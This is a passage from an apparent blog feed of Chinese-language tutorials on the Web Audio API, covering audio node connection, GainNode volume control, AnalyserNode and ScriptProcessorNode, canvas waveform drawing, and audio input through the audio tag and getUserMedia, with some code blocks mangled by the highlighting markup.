class="string">&quot;range&quot;</span> <span class="attr">min</span>=<span class="string">&quot;0&quot;</span> <span class="attr">max</span>=<span class="string">&quot;100&quot;</span> <span class="attr">id</span>=<span class="string">&quot;volume&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> <span class="title class_">AudioContext</span> = <span class="title class_">AudioContext</span> || webkitAudioContext;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> context = <span class="keyword">new</span> <span class="title class_">AudioContext</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> source = context.<span class="title function_">createMediaElementSource</span>(audio);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> <span class="title class_">Gain</span> = context.<span class="title function_">createGain</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//连接：source → Gain → destination</span></span></span><br><span class="line"><span class="language-javascript">    source.<span class="title function_">connect</span>(<span class="title class_">Gain</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">Gain</span>.<span class="title function_">connect</span>(context.<span class="property">destination</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">//音量控制</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> value;</span></span><br><span class="line"><span class="language-javascript">    onload = volume.<span class="property">onchange</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      gain.<span class="property">gain</span>.<span class="property">value</span> = volume.<span class="property">value</span> / <span class="number">200</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>十分轻松简洁的处理一个音量控制。</p><h3>二、小结</h3><p>本文主要是介绍 Web Audio API 中的 GainNode 节点，以及相关的应用。文中的两个 DEMO ，前者利用 processor 节点来处理，关于这个几点的说明，可以参考上两篇文章的接受；后者是使用 GainNode ，通过控制 Gain.gain.value 的值来调节音量的大小，过程十分简单，所以本文的思路也是比较的清晰。</p><p>如果本文中有叙述不正确的地方，还请斧正！</p><h3>三、参考资料</h3><ul><li><a href="http://www.w3.org/TR/webaudio/" target="_blank">http://www.w3.org/TR/webaudio/</a> W3C Group</li><li><a href="http://www.web-tinker.com/" target="_blank">http://www.web-tinker.com/</a> 次碳酸钴</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> webaudio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>看得到的音频流</title>
      <link href="/blog/2014/02/22/cb-webAudio-show-audio/"/>
      <url>/blog/2014/02/22/cb-webAudio-show-audio/</url>
      
        <content type="html"><![CDATA[<p><a href="http://www.cnblogs.com/hustskyking/p/webAudio-listen.html" target="_blank">上文</a>介绍了 Web Audio API 的相关知识，以及如何在你的 web 程序中引入 音频流，内容都是介绍性的，所以没有写太多 DEMO。本文重点讲解如何利用 Web Audio API 中的中间节点拿到音频信号的信息，并将信息转化成信号图绘制到 canvas 中。</p><p>从上文中我们了解到，AudioContext 是音频播放和处理的一个环境，大概的流程是这个样子：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">  +---------------+------------------------------------+</span><br><span class="line">  |<span class="string"> AudioContext  </span>|<span class="string">                                    </span>|</span><br><span class="line">  +---------------+                                    |<span class="string"></span></span><br><span class="line"><span class="string">  </span>|<span class="string">        +-------+    +-------+    +-------+         </span>|</span><br><span class="line">  |<span class="string">        </span>|<span class="string">       </span>|<span class="string">    </span>|<span class="string">       </span>|<span class="string">    </span>|<span class="string">       </span>|<span class="string">         </span>|</span><br><span class="line">==========&gt;|<span class="string"> Source</span>|<span class="string">===&gt;</span>|<span class="string">Lots of</span>|<span class="string">===&gt;</span>|<span class="string">  Dest </span>|<span class="string"> Output  </span>|</span><br><span class="line">Multi Input|<span class="string">       </span>|<span class="string">    </span>|<span class="string">       </span>|<span class="string">    </span>|<span class="string">       </span>|<span class="string">===========&gt;</span></span><br><span class="line"><span class="string">==========&gt;</span>|<span class="string">  Node </span>|<span class="string">===&gt;</span>|<span class="string"> Nodes </span>|<span class="string">===&gt;</span>|<span class="string">  Node </span>|<span class="string">         </span>|</span><br><span class="line">  |<span class="string">        </span>|<span class="string">       </span>|<span class="string">    </span>|<span class="string">       </span>|<span class="string">    </span>|<span class="string">       </span>|<span class="string">         </span>|</span><br><span class="line">  |<span class="string">        +-------+    +-------+    +-------+         </span>|</span><br><span class="line">  |<span class="string">                         </span>|<span class="string">                          </span>|</span><br><span class="line">  |<span class="string">                         </span>|<span class="string">    Created By Barret Lee </span>|</span><br><span class="line">  +-------------------------|<span class="string">--------------------------+</span></span><br><span class="line"><span class="string">                            </span>|<span class="string">         +-------------+</span></span><br><span class="line"><span class="string">                            +========&gt;</span>|<span class="string"> Other Tools </span>|</span><br><span class="line">                              signal  +-------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 AudioContext 中，通过一个结点（AudioNode）来接受输入源，中间的一些结点可以过滤、放大、去杂等处理 Source Node 的信号，处理之后可以送到 AudioContext 的输出结点，然后启用 <code>source.start()</code> 播放音频信息；也可以将处理的信息送到外部交给其他对象来处理，比如本文要谈到的，将信号交给 Canvas 来处理，这样就能看到音频信号的波形图了。</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/webAudio-show-audio.html" target="_blank">http://www.cnblogs.com/hustskyking/p/webAudio-show-audio.html</a>，转载请注明源地址。</p><p><strong>注：较新版 Google Chrome 和 Firefox 才能运行本文中的 DEMO。</strong></p><h3>一、节点的连接</h3><p>先说一说，各个节点在 AudioContext 中的连接是如何用代码实现的:</p><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建一个 AudioContext 环境</span></span><br><span class="line"><span class="keyword">var</span> <span class="keyword">context</span> = <span class="keyword">new</span> AudioContext();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> playSound() &#123;</span><br><span class="line">    <span class="comment">// 创建一个 Source 节点</span></span><br><span class="line">    <span class="keyword">var</span> source = <span class="keyword">context</span><span class="variable">.createBufferSource</span>();</span><br><span class="line">    <span class="comment">// 拿到输入源（狗吠）</span></span><br><span class="line">    source<span class="variable">.buffer</span> = dogBarkingBuffer;</span><br><span class="line">    <span class="comment">// 将 source 节点链接到 destination 节点（输出节点）</span></span><br><span class="line">    source<span class="variable">.connect</span>(<span class="keyword">context</span><span class="variable">.destination</span>);</span><br><span class="line">    <span class="comment">// currentTime 设定为 0，开始播放</span></span><br><span class="line">    source<span class="variable">.start</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的连接十分简单，直接将 source 节点连接到 destination 节点，相当于没有经过人任何处理，直接输出了，而下面的方式是创建一个中间节点，对信号做一些处理，不过在拿到 Source 的方式上跟上面有些不一样：</p><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> audio = document<span class="variable">.getElementsByTagName</span>(<span class="string">&quot;audio&quot;</span>)[<span class="number">0</span>];</span><br><span class="line"><span class="comment">// context 为一个 AudioContext 环境</span></span><br><span class="line"><span class="comment">// 从 audio 元素中拿到输入源，也就是上图所看到的 Mutil Input</span></span><br><span class="line"><span class="keyword">var</span> source = <span class="keyword">context</span><span class="variable">.createMediaElementSource</span>(audio);</span><br><span class="line"><span class="comment">// 建立一个处理延时节点</span></span><br><span class="line"><span class="keyword">var</span> delayNode = <span class="keyword">context</span><span class="variable">.createDelay</span>();</span><br><span class="line"><span class="comment">// sourceNode -&gt; delayNode -&gt; destinationNode</span></span><br><span class="line">source<span class="variable">.connect</span>(delayNode);</span><br><span class="line">delayNode<span class="variable">.connect</span>(<span class="keyword">context</span><span class="variable">.destination</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里需要注意的是，destination 是 AudioContext 实例的固有属性，他就是信号的最终汇聚的位置，也是信号的输出位置。下面是一个简单的 DEMO 代码：</p><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">&lt;audio src=<span class="string">&quot;https://qianduannotes.duapp.com/file/tankWar.mp3&quot;</span> id=<span class="string">&quot;origin&quot;</span>&gt;&lt;/audio&gt;</span><br><span class="line">&lt;audio src=<span class="string">&quot;https://qianduannotes.duapp.com/file/tankWar.mp3&quot;</span> id=<span class="string">&quot;audio&quot;</span>&gt;&lt;/audio&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;origin.play()&quot;</span> value=<span class="string">&quot;原始音质 播放&quot;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;origin.pause()&quot;</span> value=<span class="string">&quot;原始音源 暂停&quot;</span>&gt;&lt;br&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;audio.play()&quot;</span> value=<span class="string">&quot;滤波音质 播放&quot;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">input</span> <span class="keyword">type</span>=<span class="string">&quot;button&quot;</span> onclick=<span class="string">&quot;audio.pause()&quot;</span> value=<span class="string">&quot;滤波音源 暂停&quot;</span>&gt;</span><br><span class="line">&lt;script <span class="keyword">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    <span class="keyword">var</span> AudioContext = AudioContext || webkitAudioContext;</span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">context</span> = <span class="keyword">new</span> AudioContext();</span><br><span class="line">    <span class="keyword">var</span> source = <span class="keyword">context</span><span class="variable">.createMediaElementSource</span>(audio);</span><br><span class="line">    <span class="comment">// 低通滤波节点（高频信号被过滤，听到的声音会很沉闷）</span></span><br><span class="line">    <span class="keyword">var</span> FilterNode = <span class="keyword">context</span><span class="variable">.createBiquadFilter</span>(<span class="string">&quot;lowpass&quot;</span>);</span><br><span class="line">    <span class="comment">// sourceNode -&gt; FilterNode -&gt; destinationNode</span></span><br><span class="line">    source<span class="variable">.connect</span>(FilterNode);</span><br><span class="line">    FilterNode<span class="variable">.connect</span>(<span class="keyword">context</span><span class="variable">.destination</span>);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面的代码，AudioContext 获取 audio 源的原理是这样的：</p><ol><li>audio有一个内置的输出通道</li><li>AudioContext 通过 createMediaElementSource 将 audio 的输出直接拉去到新的环境中，之前 audio 环境被破坏</li><li>拉去的 source 没有 start 函数，他会一直监听 audio 的操控，当 play 函数被触发的时候，开始播放音频。也可以认为，play 函数触发了 start （老版浏览器中是 noteOn）</li></ol><p>下面是一个演示图：</p><figure class="highlight gherkin"><table><tr><td class="code"><pre><span class="line">+----------+------------------------------+</span><br><span class="line">|<span class="string"> audio    </span>|<span class="string">                              </span>|</span><br><span class="line">+----------+                              |<span class="string"></span></span><br><span class="line"><span class="string"></span>|<span class="string">     +--------+      //  +-------------+ </span>|</span><br><span class="line">|<span class="string">     </span>|<span class="string"> Source </span>|<span class="string">=====//==&gt;</span>|<span class="string"> Destination </span>|<span class="string"> </span>|</span><br><span class="line">|<span class="string">     +--------+  </span>|<span class="string"> //    +-------------+ </span>|</span><br><span class="line">|<span class="string">                 </span>|<span class="string">                       </span>|</span><br><span class="line">+-----------------|<span class="string">-----------------------+</span></span><br><span class="line"><span class="string">                  </span>|<span class="string">   Created By Barret Lee</span></span><br><span class="line"><span class="string">         +--------</span>|<span class="string">-----+--------------------------+</span></span><br><span class="line"><span class="string">         </span>|<span class="string">        ↓                                </span>|</span><br><span class="line">         |<span class="string">     +--------+    +-------+    +------+ </span>|</span><br><span class="line">         |<span class="string">     </span>|<span class="string"> Source </span>|<span class="string">===&gt;</span>|<span class="string"> Nodes </span>|<span class="string">===&gt;</span>|<span class="string"> Dest </span>|<span class="string"> </span>|</span><br><span class="line">         |<span class="string">     +--------+    +-------+    +------+ </span>|</span><br><span class="line">         |<span class="string">                          +--------------+</span></span><br><span class="line"><span class="string">         </span>|<span class="string">                          </span>|<span class="string"> AudioContext </span>|</span><br><span class="line">         +--------------------------+--------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>二、两个中间节点的介绍</h3><h4>1. ScriptProcessorNode</h4><p>我们可以直接使用 JavaScript 操控这个节点，他的作用是产生、传递、分析一段音频。他有一个 bufferSize 属性和一个 onaudioprocess 事件。初始化一个 ScriptProcessorNode：</p><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var</span> processor=context.createScriptProcessor(<span class="number">4096</span>, <span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>他接收三个参数，第一个是 bufferSize 的大小，取值范围是 <code>Math.pow(2, N) ( 8&le;N&le;14 )</code>，第二个参数是送入的 channel 数，第三个参数是输出的 channel 数。信息不会自动通过这个节点需要我们自己将输入的信号复制到输出位置去：</p><figure class="highlight verilog"><table><tr><td class="code"><pre><span class="line">processor<span class="variable">.onaudioprocess</span> = <span class="keyword">function</span>(e)&#123;</span><br><span class="line">    <span class="comment">//获取输入和输出的数据缓冲区</span></span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">input</span> = e<span class="variable">.inputBuffer</span><span class="variable">.getChannelData</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">var</span> <span class="keyword">output</span> = e<span class="variable">.outputBuffer</span><span class="variable">.getChannelData</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//将输入数缓冲复制到输出缓冲上</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>, len = <span class="keyword">input</span><span class="variable">.length</span>; i &lt; len; i++)&#123;</span><br><span class="line">        <span class="keyword">output</span>[i] = <span class="keyword">input</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这样处理的原因是因为多个输入要对应对个输出，也有可能是多对一或者一对多，所以这些信息的设定必须要人为去控制。</p><p>关于 ScriptProcessorNode 的介绍，具体请移步<a href="http://www.w3.org/TR/webaudio/#ScriptProcessorNode-section" target="_blank">http://www.w3.org/TR/webaudio/#ScriptProcessorNode-section</a></p><h4>2. AnalyserNode</h4><p>通过这个节点我们可以对信号进行频域和时域上的分析，学过 通信原理 的同学对这些属于应该是十分熟悉的。</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">interface AnalyserNode : AudioNode &#123;</span><br><span class="line"></span><br><span class="line">    // <span class="type">Real</span>-<span class="type">time</span> frequency-<span class="keyword">domain</span> data </span><br><span class="line">    <span class="type">void</span> getFloatFrequencyData(Float32Array <span class="keyword">array</span>);</span><br><span class="line">    <span class="type">void</span> getByteFrequencyData(Uint8Array <span class="keyword">array</span>);</span><br><span class="line"></span><br><span class="line">    // <span class="type">Real</span>-<span class="type">time</span> waveform data </span><br><span class="line">    <span class="type">void</span> getByteTimeDomainData(Uint8Array <span class="keyword">array</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">attribute</span> unsigned long fftSize;</span><br><span class="line">    readonly <span class="keyword">attribute</span> unsigned long frequencyBinCount;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">attribute</span> <span class="type">double</span> minDecibels;</span><br><span class="line">    <span class="keyword">attribute</span> <span class="type">double</span> maxDecibels;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">attribute</span> <span class="type">double</span> smoothingTimeConstant;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面是这个节点的接口信息，不要感到奇怪，对接口的描述，都是使用这种方式，从上面我们可以看到，他有三个方法，四个属性。fftSize 是指频率分析下的快速傅里叶变换大小，他的值被限定在 32-2048 的 2 的整数次方。</p><p>关于 AnalyserNode 的介绍，具体请移步<a href="http://www.w3.org/TR/webaudio/#AnalyserNode-section" target="_blank">http://www.w3.org/TR/webaudio/#AnalyserNode-section</a></p><h3>三、音频信息的提取</h3><p>利用上面介绍的两个节点可以十分轻松的提取到音频信息，如使用 ScriptProcessorNode，在他的 onaudioprocess 触发的时候，可以拿到 input 信息，此时也就是音频信息流。</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">processor.onaudioprocess = <span class="keyword">function</span>(e)&#123;</span><br><span class="line">    <span class="comment">//获取输入和输出的数据缓冲区</span></span><br><span class="line">    var input = e.inputBuffer.get<span class="constructor">ChannelData(0)</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">do</span><span class="constructor">Something(<span class="params">input</span>)</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这种方式拿到数据的效率是比较低的，一般可以直接使用 AnalyserNode 节点。这个节点中一个获取缓冲数据区的方法叫做 getByteTimeDomainData，这个方法的设计是十分偏底层的，或者对 JSer 来说，这个借口的设计并不合理，可以看看：</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以fftSize为长度创建一个字节数组作为数据缓冲区</span></span><br><span class="line">var output = <span class="keyword">new</span> <span class="constructor">Uint8Array(<span class="params">analyser</span>.<span class="params">fftSize</span>)</span>;</span><br><span class="line"><span class="comment">// 将获取得到的数据赋值给 output</span></span><br><span class="line">analyser.get<span class="constructor">ByteTimeDomainData(<span class="params">output</span>)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里是把 output 作为引用传进 getByteTimeDomainData 函数中，相信大家应该没有在 JS 中遇到过这样的写法吧~ （我觉得在该 web 标准定稿的时候，这里一定会做修改！）</p><h3>四、信号图的绘制</h3><p>上面我们已经拿到了信号数据了，绘制工作其实就是 canvas 的事情啦~</p><figure class="highlight maxima"><table><tr><td class="code"><pre><span class="line"><span class="built_in">var</span> <span class="built_in">width</span> = canvas.<span class="built_in">width</span>,</span><br><span class="line">    <span class="built_in">height</span> = canvas.<span class="built_in">height</span>,</span><br><span class="line">    g = canvas.getContext(<span class="string">&quot;2d&quot;</span>);</span><br><span class="line"></span><br><span class="line">// 将坐标原点移动到(<span class="number">0.5</span>, <span class="built_in">height</span> / <span class="number">2</span> + <span class="number">0.5</span>)的位置</span><br><span class="line">g.<span class="built_in">translate</span>(<span class="number">0.5</span>, <span class="built_in">height</span> / <span class="number">2</span> + <span class="number">0.5</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后绘制图形：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">processor.<span class="property">onaudioprocess</span>=<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="comment">//获取输入和输出的数据缓冲区</span></span><br><span class="line">    <span class="keyword">var</span> input = e.<span class="property">inputBuffer</span>.<span class="title function_">getChannelData</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">var</span> output = e.<span class="property">outputBuffer</span>.<span class="title function_">getChannelData</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">//将输入数缓冲复制到输出缓冲上</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>; i</span><br><span class="line">&lt;p&gt;下面是整个 <span class="variable constant_">DEMO</span> 的代码，效果预览：&lt;/p&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://images.cnitblog.com/blog/387325/201402/222051302848233.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">p</span>&gt;</span>代码：<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br></pre></td></tr></table></figure><p><canvas id="canvas" width="400" height="100"></canvas><br><audio id="audio" autoplay src="https://qianduannotes.duapp.com/file/tankWar.mp3"></audio><br><br><br><input type="button" onclick="audio.play()" value="播放"><br><input type="button" onclick="audio.pause()" value="暂停"></p><script>var AudioContext=AudioContext||webkitAudioContext;var context=new AudioContext;//从元素创建媒体节点var media=context.createMediaElementSource(audio);//创建脚本处理节点var processor=context.createScriptProcessor(4096,1,1);//Canvas初始化var width=canvas.width,height=canvas.height;var g=canvas.getContext("2d");g.translate(0.5,height/2+0.5);//连接：媒体节点→控制节点→输出源media.connect(processor);processor.connect(context.destination);//控制节点的过程处理processor.onaudioprocess=function(e){  //获取输入和输出的数据缓冲区  var input=e.inputBuffer.getChannelData(0);  var output=e.outputBuffer.getChannelData(0);  //将输入数缓冲复制到输出缓冲上  for(var i=0;i<input.length;i++)output[i]=input[i];  //将缓冲区的数据绘制到Canvas上  g.clearRect(-0.5,-height/2-0.5,width,height);  g.beginPath();  for(var i=0;i<width;i++)    g.lineTo(i,height/2*output[output.length*i/width|0]);  g.stroke();};</script><p>DEMO</p><pre><code>&lt;p&gt;该段代码引自次碳酸钴的&lt;a href=&quot;http://www.web-tinker.com/article/20498.html&quot; target=&quot;_blank&quot;&gt;博客&lt;/a&gt;。&lt;/p&gt;&lt;h3&gt;五、小结&lt;/h3&gt;&lt;p&gt;本文着重讲述了 AudioContext 内部节点之间的交互原理，以及如何使用节点获取数据，关于图形的绘制是 canvas 的操作，不是本系列文章的重点，所以一笔带过。&lt;/p&gt;&lt;p&gt;如果文中有叙述不正确的地方，还请斧正！&lt;/p&gt;&lt;h3&gt;六、参考资料&lt;/h3&gt;&lt;ul&gt;&lt;li&gt;&lt;a href=&quot;http://www.w3.org/TR/webaudio/&quot; target=&quot;_blank&quot;&gt;http://www.w3.org/TR/webaudio/&lt;/a&gt; W3C Group&lt;/li&gt;&lt;li&gt;&lt;a href=&quot;http://www.web-tinker.com/&quot; target=&quot;_blank&quot;&gt;http://www.web-tinker.com/&lt;/a&gt; 次碳酸钴&lt;/li&gt;&lt;/ul&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> webaudio </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>让音乐响起来</title>
      <link href="/blog/2014/02/20/cb-webAudio-listen/"/>
      <url>/blog/2014/02/20/cb-webAudio-listen/</url>
      
        <content type="html"><![CDATA[<p>本系列文章主要是介绍 Web Audio API 的相关知识，由于该技术还处在 web 草案阶段（很多标准被提出来，至于取舍需要等待稳定版文档来确定，草案阶段的文档很多都会被再次编辑甚至重写、全部删除等，不适合作为正式参考），很多 API 都是未确定的，目前支持 Web Audio API 的浏览器是较新版的 Google Chrome 和 FireFox，其他浏览器暂时还没有兼容。</p><p>现在的网络硬件环境还没有达到普遍语音通信的条件，但是 web语音通信 一定会成为后期 web 研究的一个重要话题，凭着一点个人兴趣，拿出来研究研究~</p><p>本文主要介绍 Web Audio API 的相关特性，以及音频源的获取方式。</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/webAudio-listen.html">http://www.cnblogs.com/hustskyking/p/webAudio-listen.html</a>，转载请注明源地址。</p><h3>一、Web Audio</h3><p>在 <code>&lt;audio&gt;</code> 标签的到来之前，Flash 以及其他的插件相继打破 web 的宁静，而如今 audio 被送到了 web 开发之中，我们再也不需要引用各种插件来播放声音了。</p><h4>1. Web Audio API 的特性</h4><p>Web Audio API 是 JavaScript 中主要用于在网页应用中处理音频请求的一个高级应用接口，这个 API 目的是用于让最新技术与传统的游戏音频引擎的综合处理相兼容，也即尽力提供一些桌面音频处理程序的要求。</p><ul><li>查看音频播放期间调度事件发生的确切时间；</li><li>支持各种类型的音频过滤波器以实现各种效果，包括回声、消除噪音等；</li><li>支持利用合成声音（Sound synthesis）创建电子音乐；</li><li>支持3D位置音频模拟效果，比如某种声音随着游戏场景而移动；</li><li>支持外部输入的声音与 WebRTC 进行集成（调用 WebRTC ，在你的设备中增添吉他声），或者在 WebRTC 中调用其他地方传输过来的声音；</li><li>利用音频数据分析创造良好的可视化声音等。</li></ul><h4>2. AudioContent 简介</h4><p>Web Audio API 可以用来操作或者播放网页以及应用中的 audio 资源，在一个 Audio上下文环境（AudioContext）中，有各种 Audio节点（AudioNode），如：</p><table><thead><tr><th>Interface</th><th>description</th></tr></thead><tbody><tr><td>AudioContext</td><td>包含表示连接中间件 AudioNodes 的音频信号曲线图</td></tr><tr><td>AudioNode</td><td>表示 audio源，audio输出以及 中间处理模块，他处在 AudioContext 的上下文中</td></tr><tr><td>AudioDestinationNode</td><td>他是 AudioNode 的一个子类，表示所有被渲染音频流到达的最终地点</td></tr><tr><td>AudioBuffer</td><td>表示 audio资源 的一个临时缓存，可表示一个音频剪辑</td></tr><tr><td>AudioBufferSourceNode</td><td>从 AudioBuffer 中生成 audio 的 AudioNode 节点</td></tr><tr><td>ScriptProcessorNode</td><td>一个可以直接被 JS 操作的 AudioNode 节点</td></tr><tr><td>GainNode</td><td>音频增益节点</td></tr><tr><td>OscillatorNode</td><td>一个可产生固定频率的 audio 源</td></tr></tbody></table><p>还有其他的 API 可以查看<a href="http://www.w3.org/TR/webaudio/#APIOverview" target="_blank">http://www.w3.org/TR/webaudio/#APIOverview</a>.</p><p>使用 AudioContext 实例，我们可以将生成的一个或者多个音频流连接到声音的输出位置，这个连接并不一定是直接送到输出端，期间可以使用 AudioNodes 作为中继器和处理器，让这些声音信号有一个更好的效果。</p><p>单个 AudioContext 实例可以支持多音频的输入，所以对于一个 audio 应用我们只需要创建一个实例就行了。很多诸如创建一个 AudioNode 节点、解码音频文件等方法都是 AudioContext 的内置方法。创建一个 AudioContext 上下文也十分简单：</p><figure class="highlight dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> context;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="built_in">window</span>.AudioContext = <span class="built_in">window</span>.AudioContext || <span class="built_in">window</span>.webkitAudioContext;</span><br><span class="line">    context = <span class="keyword">new</span> AudioContext();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span>(e) &#123;</span><br><span class="line">    alert(<span class="string">&#x27;请更新至最新版的 Chrome 或者 Firefox&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3>二、音频流的获取</h3><h4>1. 标签引入</h4><p>标签引入是最直接的方式，</p><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">&lt;<span class="selector-tag">audio</span> autoplay <span class="attribute">src</span>=<span class="string">&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot;</span>&gt;</span><br><span class="line">    浏览器不支持 <span class="selector-tag">audio</span> 标签。</span><br><span class="line">&lt;/audio&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果浏览器不支持 audio 标签，便会将其当做一个普通元素来解析，中间一行字也就会被显示出来。而支持 audio 标签的浏览器会忽略标签内任何文本。我们还可以为他加上 autoplay 、loop 等属性，使音频在进入页面之后立即循环播放。</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;audio autoplay<span class="operator">=</span><span class="string">&quot;autoplay&quot;</span> controls<span class="operator">=</span><span class="string">&quot;controls&quot;</span> src<span class="operator">=</span><span class="string">&quot;http://qianduannotes.duapp.com/file/tankWar.mp3&quot;</span>&gt;</span><br><span class="line">    浏览器不支持 audio 标签。</span><br><span class="line">&lt;/audio&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>controls 属性是用来控制显示音频文件的控制部分的。默认未设置 controls 属性。</p><h4>2. <span>webRTC mediaStream</span>&nbsp;Media Capture <span>(多谢<a href="http://www.cnblogs.com/hehe123/" target="_blank">@Hehe123</a>提醒,RTC属于通信了，此处只是获取 media 流)</span></h4><p>利用 getUserMedia 拿到本地的音频流。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 前缀处理</span></span><br><span class="line">window.AudioContext = window.AudioContext ||</span><br><span class="line">                  window.webkitAudioContext;</span><br><span class="line">navigator.getUserMedia =  navigator.getUserMedia ||</span><br><span class="line">                      navigator.webkitGetUserMedia ||</span><br><span class="line">                      navigator.mozGetUserMedia ||</span><br><span class="line">                      navigator.msGetUserMedia;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> context = <span class="keyword">new</span> AudioContext();</span><br><span class="line"></span><br><span class="line">navigator.getUserMedia(&#123;<span class="attr">audio</span>: <span class="literal">true</span>&#125;, <span class="keyword">function</span>(<span class="params">stream</span>) &#123;</span><br><span class="line">  <span class="comment">// 获取本地流送入 AudioContext</span></span><br><span class="line">  <span class="keyword">var</span> microphone = context.createMediaStreamSource(stream);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// filter为一个中间处理器，用来过滤音频</span></span><br><span class="line">  <span class="keyword">var</span> <span class="built_in">filter</span> = context.createBiquadFilter();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// microphone -&gt; filter -&gt; destination.</span></span><br><span class="line">  microphone.connect(<span class="built_in">filter</span>);</span><br><span class="line">  <span class="built_in">filter</span>.connect(context.destination);</span><br><span class="line">&#125;, <span class="keyword">function</span>(<span 